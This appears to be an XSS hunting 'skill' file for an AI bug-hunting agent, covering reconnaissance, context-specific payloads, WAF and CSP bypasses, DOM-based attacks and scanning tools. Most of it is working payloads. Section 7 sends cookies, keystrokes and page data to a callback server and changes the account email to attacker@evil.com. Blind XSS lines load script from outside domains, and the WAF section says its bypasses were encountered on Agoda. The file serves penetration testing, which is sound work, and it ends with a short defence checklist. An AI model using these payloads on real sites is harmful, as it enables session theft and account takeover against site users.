# XSS (Cross-Site Scripting) — Skill v1.0

## Overview
Dedicated skill for detecting and exploiting Reflected, Stored, DOM-based, and Blind XSS vulnerabilities. Covers context-specific injection, WAF bypass, CSP evaluation, and automation tooling.

## Prerequisites
- A working proxy (Caido / Burp Suite)
- Browser with DevTools
- A XSS collab/callback service or custom listener
- (Optional) xsstrike, dalfox, nuclei

---

## 1. Reconnaissance Phase — XSS Surface Discovery

### A. Parameter Discovery
```
GET /path?q=PARAM&debug=1&callback=jsonp
POST form fields, JSON body, XML body
Headers: User-Agent, Referer, X-Forwarded-For, Origin, X-Forwarded-Host
```
- Extract all parameters from JS bundles (including lazy chunks)
- Check URL fragment (#) and URL path itself for injection points
- Check JSONP callback parameters

### B. Reflection Point Detection
Inject unique canary strings and scan every endpoint/parameter:
```
canaryXSS001
```
Then grep/search responses for the string. If reflected, test deeper.

### C. Context Classification (CRITICAL — determines payload strategy)
Once a reflection point is found, classify the injection context:

| Context | Example | Strategy |
|---------|---------|----------|
| **HTML Body** | `<div>INPUT</div>` | Break out: `><img src=x onerror=alert(1)>` |
| **HTML Attribute** | `<input value="INPUT">` | Break attribute: `"onmouseover=alert(1)` |
| **JavaScript String** | `var x = 'INPUT';` | Break string: `';alert(1)//` |
| **JavaScript Template Literal** | `var x = \`INPUT\`;` | Use: `${alert(1)}` |
| **URL/Href** | `<a href="INPUT">` | Use: `javascript:alert(1)` |
| **CSS** | `<style>INPUT</style>` | Use: `background:url(javascript:alert(1))` or `expression(alert(1))` |
| **Angular/Vue/React** | `{{INPUT}}` | Use: `{{constructor.constructor('alert(1)')()}}` |

### D. Content-Type Detection
- **text/html** → standard XSS works
- **application/json** → XSS via Content-Type mismatch (IE/older browsers)
- **application/javascript** → JSONP/XSSI
- **text/javascript** → same as JS context

---

## 2. Reflected XSS Testing

### A. HTML Body Context
```
Standard:        <script>alert(1)</script>
No filter:       <img src=x onerror=alert(1)>
SVG:             <svg onload=alert(1)>
Details:         <details open ontoggle=alert(1)>
Body:            <body onload=alert(1)>
Input:           <input autofocus onfocus=alert(1)>
Select:          <select autofocus onfocus=alert(1)>
Keydown:         <input autofocus onfocusin=alert(1)>
```

### B. HTML Attribute Context
```
Double-quoted:   " onfocus=alert(1) autofocus="
Single-quoted:   ' onfocus=alert(1) autofocus='
No quotes:       x onfocus=alert(1) autofocus=x
Space-limited:   "autofocus onfocus=alert(1)
Href:            javascript:alert(1)
```

### C. JavaScript String Context
```
Single quote:    '-alert(1)-'
Double quote:    "-alert(1)-"
Backtick:        `-${alert(1)}-`
With closing:    </script><script>alert(1)</script>
```

### D. URL/Javascript URI
```
javascript:alert(document.domain)
```

---

## 3. Stored XSS Testing

Test every input that persists data:

### A. User Content Features
- Profile fields (name, bio, website, location)
- Comments/reviews/ratings
- File uploads (SVG, HTML, DOCX with embedded HTML)
- Rich text editors (TinyMCE, Quill, CKEditor — check saved output)
- Chat messages
- Order/item names

### B. File Upload XSS Vectors
```
SVG XSS:        <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
SVG onload:     <svg xmlns="http://www.w3.org/2000/svg"><image href="x" onload="alert(1)"/>
SVG animate:    <svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)"/>
HTML file:      Standard HTML with script tag
PDF XSS:        PDF with embedded JavaScript action
DOCX XSS:       DOCX with embedded HTML/script in document.xml
```

### C. Blind XSS
Use a callback service (XSS Hunter, Burp Collaborator, custom domain):
```
"><script src=//burp-collab-domain></script>
'><img src=//xss-hunter-domain/test.png>
</textarea><script src=//your-server/test.js></script>
```
Submit to: comment forms, feedback forms, contact forms, bug report forms, support tickets, user agent display, profile fields visible to admins only

---

## 4. DOM-Based XSS Testing

### A. Source Identification (Where untrusted data enters)
```
Sources:
- document.URL / document.documentURI
- location.href / location.hash / location.search / location.pathname
- document.referrer
- window.name
- postMessage event data
- document.cookie
- sessionStorage / localStorage
- window.opener.location
- history.pushState state
- URL.createObjectURL
```

### B. Sink Identification (Where data is rendered unsafely)
```
At-risk Web APIs:
- element.innerHTML = data
- element.outerHTML = data
- document.write()
- document.writeln()
- eval(string)
- setTimeout(string) — FIRST arg as string, not function
- setInterval(string)
- new Function(string)
- element.insertAdjacentHTML(position, data)
- element.setAttribute('src', data) — if data starts with javascript:
- element.setAttribute('href', data)
- location.href / location.assign('javascript:...')
- $.html(data) — jQuery
- React dangerouslySetInnerHTML
- Vue v-html
- Angular [innerHTML]
```

### C. Prototype Pollution → DOM XSS (Chained)
```
Source:
  https://site.com/?__proto__[shell]=node

Gadget search pattern (in JS bundles):
  obj[a][b] = value  → where obj is an object uncontrolled
  obj[x] = y         → where x is attacker-controlled, y reaches a sink

Common gadgets:
  Object assignment → prototype chain → innerHTML sink
  jQuery $.extend → polluted property → eval gadget
```

### D. postMessage XSS
```
// Vulnerable handler
window.addEventListener('message', function(e) {
    document.getElementById('msg').innerHTML = e.data;
});

// Exploit
<iframe src="https://target.com"></iframe>
<script>
document.querySelector('iframe').contentWindow.postMessage('<img src=x onerror=alert(1)>', '*');
</script>
```

### E. DOM Clobbering
```
<a id="config"></a>
<a id="config"></a> — creates HTMLCollection via getElementById('config')
<form id="config"><input name="apiUrl" value="//evil.com/"></form>

Exploit: when JS checks window.config.apiUrl, returns the clobbered value
```

---

## 5. CSP Analysis & Bypass

### A. CSP Detection
```
Check response header: Content-Security-Policy
Common weaknesses:

unsafe-inline:          Direct XSS execution possible
unsafe-eval:            eval(), setTimeout(string) available
CDN whitelisted:        google-analytics.com, livechat.inc, etc. — find script gadgets
nonce-based:            Look for nonce reuse / injection
strict-dynamic:         Can't inject from static scripts, but can from trusted scripts
```

### B. CSP Bypass Techniques
```
Angular.js sandbox escape (legacy):
  {{a='constructor';b='a';c='alert(1)';constructor.constructor(a+b)(c)}}

JSONP endpoint abuse:
  <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)">

CDN Library Gadgets (https://github.com/BlackFan/content-security-policy-bypass):
  Find known gadgets on CDN whitelisted domains
  Angular, Google APIs, YouTube, etc.

script gadgets (Google Closure, TinyMCE, etc.)
  window.___grecaptcha_cfg — reCAPTCHA gadget
  window.CKEDITOR — CKEditor assets
```

---

## 6. WAF Bypass for XSS

### A. Akamai WAF Bypass (as encountered on Agoda)
```
Case mutation:         <ScRiPt>alert(1)</ScRiPt>
Nested tags:           <scr<script>ipt>alert(1)</scr<script>ipt>
Unicode escapes:       \u0061lert(1)
HTML entities:         &#97;lert(1) — only works in HTML context, not JS
Hex encoding:          <img src=x onerror=&#x61;lert(1)>
Null byte:             <%00script>alert(1)</script>
UTF-7 (legacy IE):     +ADw-script+AD4-alert(1)-
Double URL encode:     %253Cscript%253E (first %25 = literal %)
Tab/Newline inject:    <img\t src=x onerror=alert(1)>
Event handler alt:     <body/onload=alert(1)>  <svg/onload=alert(1)>
```

### B. Cloudflare WAF Bypass
```
Dangling markup:       <img src="https://evil.com/?x=
JSON padding:          {"foo":"<img src=x onerror=alert(1)>"}
```
Exfiltrate via: `<form action="https://evil.com"><button>Click</button></form>` + `autofocus`

### C. Generic WAF Bypass Patterns
```
HTTP Parameter Pollution (HPP):
  ?param=good&param=<script>alert(1)</script>

HTTP Method Override:
  POST with X-HTTP-Method-Override: GET

Content-Type Bypass:
  Change Content-Type to application/x-www-form-urlencoded
  Use charset: ibm037, utf-7

Chunked Transfer Encoding:
  Sending payload split across chunks
```

---

## 7. XSS Exploitation (Impact Demonstration)

### A. Cookie Theft
```
document.location='//collab-server/?c='+document.cookie
<img src=x onerror="fetch('//collab-server/?c='+document.cookie)">
```

### B. Keylogging
```
document.onkeypress = function(e) {
    fetch('//collab-server/?k='+e.key);
};
```

### C. Page Content Exfiltration
```
fetch('/api/user/profile').then(r=>r.text()).then(d=>{
    fetch('//collab-server/?d='+btoa(d));
});
fetch('/api/csrf-token').then(r=>r.text()).then(t=>{
    // Use CSRF token to perform actions
});
```

### D. Full Account Takeover
```
// Change email/phone — requires CSRF token extraction first
// Or use XSS to call the API directly
fetch('/api/user/email', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'})
});
```

### E. Keylogger as Service Worker
```
// Register a service worker that logs all keystrokes
navigator.serviceWorker.register('/sw.js');
// sw.js intercepts all fetch requests and logs to attacker
```

---

## 8. Automation & Tooling

### A. XSStrike (CLI)
```
pip3 install xsstrike
python3 xsstrike -u "https://target.com/page?q=test" --params
python3 xsstrike -u "https://target.com/page" --data "name=test&email=test"
python3 xsstrike -u "https://target.com/page" --fuzzer   # heavy fuzzing mode
python3 xsstrike -u "https://target.com/page" --crawl    # crawl + test
```

### B. Dalfox
```
dalfox url "https://target.com/page?q=FUZZ" -p "q"
dalfox url "https://target.com/page" --data "q=FUZZ"
dalfox file urls.txt -w 50              # batch scan from file
```

### C. Nuclei XSS Templates
```
nuclei -u "https://target.com" -t ~/nuclei-templates/vulnerabilities/generic/xss-probe.yaml
nuclei -u "https://target.com/page?q=test" -tags xss
```

### D. Manual Semi-Automated (Best Approach)
1. Proxy recording with Caido/Burp
2. Identify endpoints with reflection via canary string search
3. For each reflective endpoint, context-classify and test payloads
4. Use Burp Intruder / Caido automate with context-specific wordlists
5. Check stored endpoints by triggering in browser

---

## 9. Common XSS Hunting Workflow

```
1. Extract JS bundles (incl. lazy chunks) — find all parameters
2. Hunt for reflection points — canary string in every param
3. Classify reflection context — HTML/JS/attribute
4. Craft context-specific payload — test via Caido/Burp
5. Bypass filters/WAF — encoding, null bytes, event handler variants
6. Validate in browser — XSS is ONLY confirmed if alert fires
7. Escalate to impact — cookie theft, CSRF, account takeover
8. Report with proof — HTTP request/response + screenshot
```

---

## 10. XSS Defense Checklist (for report)

- CSP header missing or weak
- Input encoding mismatch (server reflects raw input)
- InnerHTML/document.write sinks in JS
- postMessage with no origin validation
- Missing X-Content-Type-Options
- Angular/Vue/React with dangerouslySetInnerHTML/v-html
- JSONP endpoint with no callback validation
- File upload XSS vectors (SVG, HTML, DOCX)
- DOM clobbering via global variables
- URL fragment/hash reflected into DOM

---

## References
- Anthropic-Cybersecurity-Skills: `testing-for-xss-vulnerabilities`, `exploiting-prototype-pollution-in-javascript`
- Claude-BugHunter: `hunt-xss`, `hunt-dom`
- PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- CSP Bypass: https://github.com/BlackFan/content-security-policy-bypass
